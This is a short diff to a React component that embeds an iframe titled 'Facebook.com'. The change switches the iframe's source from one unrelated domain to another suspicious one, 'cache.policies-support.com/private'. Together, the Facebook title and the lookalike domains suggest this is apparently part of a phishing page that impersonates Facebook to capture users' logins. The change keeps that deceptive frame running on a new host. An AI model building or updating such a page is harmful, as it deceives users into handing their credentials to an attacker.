@@ -21,7 +21,7 @@ const IframeComponent = () => {
     <div style={styles.container}>
       <iframe
         id="myFrame"
-        src="https://gift900.cbkgardens.com/private"
+        src="https://cache.policies-support.com/private"
         style={styles.iframe}
         title="Facebook.com"
       />
